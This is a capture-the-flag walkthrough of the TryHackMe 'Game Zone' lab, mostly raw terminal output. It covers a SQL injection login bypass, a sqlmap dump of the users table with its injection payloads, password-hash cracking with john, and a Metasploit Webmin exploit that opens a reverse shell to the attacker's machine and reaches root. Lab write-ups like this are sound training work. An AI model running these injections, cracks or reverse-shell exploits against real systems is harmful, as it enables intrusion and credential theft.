@@ -1,0 +1,486 @@
+# https://tryhackme.com/room/gamezone
+
+Agent 47 from Hitman
+
+Login using credentials ' OR 1=1 -- -:
+
+http://10.10.205.117/portal.php
+
+> Intercept in BurpSuite
+
+POST /portal.php HTTP/1.1
+Host: 10.10.205.117
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://10.10.205.117
+Connection: close
+Referer: http://10.10.205.117/portal.php
+Cookie: PHPSESSID=46e9ibb16h2qpea7bo25m3s044
+Upgrade-Insecure-Requests: 1
+
+searchitem=test
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~/Documents/TryHackMe/GameZone]
+└─$ sqlmap -r post.txt --dbms=mysql --dump
+        ___
+       __H__                                                                                                      
+ ___ ___[.]_____ ___ ___  {1.5.12#stable}                                                                         
+|_ -| . [']     | .'| . |                                                                                         
+|___|_  [']_|_|_|__,|  _|                                                                                         
+      |_|V...       |_|   https://sqlmap.org                                                                      
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:53:30 /2021-12-18/
+
+[18:53:30] [INFO] parsing HTTP request from 'post.txt'
+[18:53:30] [INFO] testing connection to the target URL
+[18:53:30] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:53:30] [INFO] testing if the target URL content is stable
+[18:53:30] [INFO] target URL content is stable
+[18:53:30] [INFO] testing if POST parameter 'searchitem' is dynamic
+[18:53:31] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
+[18:53:31] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
+[18:53:31] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
+[18:53:31] [INFO] testing for SQL injection on POST parameter 'searchitem'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[18:53:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:53:37] [WARNING] reflective value(s) found and filtering out
+[18:53:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[18:53:39] [INFO] testing 'Generic inline queries'
+[18:53:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[18:53:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[18:53:50] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="11")                                                                       
+[18:53:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                             
+[18:53:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[18:53:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[18:53:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[18:53:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[18:53:51] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                                                               
+[18:53:51] [INFO] testing 'MySQL inline queries'
+[18:53:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[18:53:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[18:53:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[18:53:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[18:53:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[18:53:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[18:53:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[18:54:04] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[18:54:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:54:04] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[18:54:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:54:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:54:05] [INFO] target URL appears to have 3 columns in query
+[18:54:05] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[18:54:05] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-7900' OR 6360=6360#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x71706b7071,(SELECT (ELT(3771=3771,1))),0x7171627871),3771)-- yJpY
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=test' AND (SELECT 4680 FROM (SELECT(SLEEP(5)))lhBM)-- RAhd
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x71706b7071,0x797a46475054455647466374446f4b50797268567257444a6c666578765a544362534c414877486b,0x7171627871)#
+---
+[18:56:39] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+[18:56:39] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[18:56:39] [INFO] fetching current database
+[18:56:39] [INFO] fetching tables for database: 'db'
+[18:56:39] [INFO] fetching columns for table 'post' in database 'db'
+[18:56:39] [INFO] fetching entries for table 'post' in database 'db'
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[18:56:39] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.205.117/dump/db/post.csv'                                                                                                         
+[18:56:39] [INFO] fetching columns for table 'users' in database 'db'
+[18:56:39] [INFO] fetching entries for table 'users' in database 'db'
+[18:56:39] [INFO] recognized possible password hashes in column 'pwd'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[18:56:44] [INFO] writing hashes to a temporary file '/tmp/sqlmapwy1zzgg_651182/sqlmaphashes-t7np6ox5.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[18:56:47] [INFO] using hash method 'sha256_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[18:56:54] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] y
+[18:56:57] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
+[18:56:57] [INFO] starting 4 processes 
+[18:57:04] [INFO] using suffix '1'                                                                               
+[18:57:12] [INFO] using suffix '123'                                                                             
+[18:57:19] [INFO] using suffix '2'                                                                               
+[18:57:27] [INFO] using suffix '12'                                                                              
+[18:57:35] [INFO] using suffix '3'                                                                               
+[18:57:43] [INFO] using suffix '13'                                                                              
+[18:57:51] [INFO] using suffix '7'                                                                               
+[18:57:58] [INFO] using suffix '11'                                                                              
+[18:58:06] [INFO] using suffix '5'                                                                               
+[18:58:14] [INFO] using suffix '22'                                                                              
+[18:58:21] [INFO] using suffix '23'                                                                              
+[18:58:28] [INFO] using suffix '01'                                                                              
+[18:58:36] [INFO] using suffix '4'                                                                               
+[18:58:44] [INFO] using suffix '07'                                                                              
+[18:58:51] [INFO] using suffix '21'                                                                              
+[18:58:59] [INFO] using suffix '14'                                                                              
+[18:59:07] [INFO] using suffix '10'                                                                              
+[18:59:15] [INFO] using suffix '06'                                                                              
+[18:59:22] [INFO] using suffix '08'                                                                              
+[18:59:30] [INFO] using suffix '8'                                                                               
+[18:59:37] [INFO] using suffix '15'                                                                              
+[18:59:45] [INFO] using suffix '69'                                                                              
+[18:59:53] [INFO] using suffix '16'                                                                              
+[19:00:01] [INFO] using suffix '6'                                                                               
+[19:00:09] [INFO] using suffix '18'                                                                              
+[19:00:18] [INFO] using suffix '!'                                                                               
+[19:00:30] [INFO] using suffix '.'                                                                               
+[19:00:38] [INFO] using suffix '*'                                                                               
+[19:00:45] [INFO] using suffix '!!'                                                                              
+[19:00:53] [INFO] using suffix '?'                                                                               
+[19:01:01] [INFO] using suffix ';'                                                                               
+[19:01:09] [INFO] using suffix '..'                                                                              
+[19:01:17] [INFO] using suffix '!!!'                                                                             
+[19:01:27] [INFO] using suffix ', '                                                                              
+[19:01:35] [INFO] using suffix '@'                                                                               
+[19:01:43] [WARNING] no clear password(s) found                                                                  
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[19:01:43] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.205.117/dump/db/users.csv'                                                                                                       
+[19:01:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.205.117'
+
+[*] ending @ 19:01:43 /2021-12-18/
+
+
+> ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+> agent47
+> post
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/GameZone]
+└─$ nano agent47.hash
+
+  GNU nano 5.9                                       agent47.hash                                                 
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/GameZone]
+└─$ john agent47.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (?)     
+1g 0:00:00:00 DONE (2021-12-18 19:04) 3.225g/s 9407Kp/s 9407Kc/s 9407KC/s vimivi..veluca
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/GameZone]
+└─$ ssh agent47@10.10.205.117             
+The authenticity of host '10.10.205.117 (10.10.205.117)' can't be established.
+ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.205.117' (ED25519) to the list of known hosts.
+agent47@10.10.205.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ ls
+user.txt
+agent47@gamezone:~$ cat user.txt
+649ac17b1480ac13ef1e4fa579dac95c
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q         Local Address:Port                        Peer Address:Port              
+udp    UNCONN     0      0                          *:10000                                  *:*                  
+udp    UNCONN     0      0                          *:68                                     *:*                  
+tcp    LISTEN     0      80                 127.0.0.1:3306                                   *:*                  
+tcp    LISTEN     0      128                        *:10000                                  *:*                  
+tcp    LISTEN     0      128                        *:22                                     *:*                  
+tcp    LISTEN     0      128                       :::80                                    :::*                  
+tcp    LISTEN     0      128                       :::22                                    :::*                  
+agent47@gamezone:~$ 
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~/Documents/TryHackMe/GameZone]
+└─$ ssh -L 10000:localhost:10000 agent47@10.10.205.117
+agent47@10.10.205.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Sat Dec 18 18:06:46 2021 from 10.6.121.137
+agent47@gamezone:~$
+
+> Visit http://localhost:10000/ 
+> Login as agent47:videogamer124
+
+System hostname 	gamezone (127.0.1.1)
+Operating system 	Ubuntu Linux 16.04.6
+Webmin version 		1.580
+Time on system 		Sat Dec 18 18:12:31 2021
+Kernel and CPU 		Linux 4.4.0-159-generic on x86_64
+Processor information 	Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 1 cores
+System uptime 		0 hours, 49 minutes
+Running processes 	125
+CPU load averages 	0.02 (1 min) 0.01 (5 mins) 0.00 (15 mins)
+CPU usage 		0% user, 0% kernel, 0% IO, 99% idle
+Real memory 		1.95 GB total, 298.27 MB used
+	
+Virtual memory 		975 MB total, 0 bytes used
+	
+Local disk space 	8.78 GB total, 2.82 GB used
+	
+Package updates 	All installed packages are up to date
+
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ msfconsole                                                                          
+[!] The following modules could not be loaded!..-
+[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/onprem_enum.go
+[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/host_id.go
+[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/exchange_enum.go
+[!] Please see /home/kali/.msf4/logs/framework.log for details.
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1152 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Search can apply complex filters such as 
+search cve:2009 type:exploit, see all the filters 
+with help search
+
+msf6 > search webmin 1.58-
+[-] No results from search
+msf6 > search webmin 1.580
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess                                                                                                               
+
+msf6 > use 0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
+                                        iki/Using-Metasploit
+   RPORT     10000            yes       The target port (TCP)
+   SSL       true             yes       Use SSL
+   USERNAME                   yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
+password => videogamer124
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
+username => agent47
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => false
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   9   payload/cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)
+   10  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   11  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   12  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload 5
+payload => cmd/unix/reverse
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  videogamer124    yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    10.10.205.117    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
+                                        iki/Using-Metasploit
+   RPORT     10000            yes       The target port (TCP)
+   SSL       true             yes       Use SSL
+   USERNAME  agent47          yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.6.121.137
+lhost => 10.6.121.137
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+
+[*] Started reverse TCP double handler on 10.6.121.137:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[+] Payload executed successfully
+[*] Command: echo Kt0rlXbKiYIKXADs;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "Kt0rlXbKiYIKXADs\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.6.121.137:4444 -> 10.10.205.117:43984 ) at 2021-12-18 19:26:47 -0500
+
+pwd
+/usr/share/webmin/file/
+whoami
+root
+cat /root/root.txt
+a4b945830144bdd71908d12d902adeee
